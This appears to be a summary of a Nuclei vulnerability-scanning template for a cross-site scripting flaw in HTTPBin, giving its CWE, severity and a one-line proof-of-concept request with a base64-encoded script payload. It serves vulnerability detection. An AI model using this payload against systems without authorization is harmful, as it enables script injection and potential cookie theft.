# Nuclei Template: HTTPBin - Cross-Site Scripting
**Template ID:** httpbin-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`httpbin-xss.yaml`)

## Vulnerability Information & PoC

## Description
HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

## References
- https://github.com/postmanlabs/httpbin
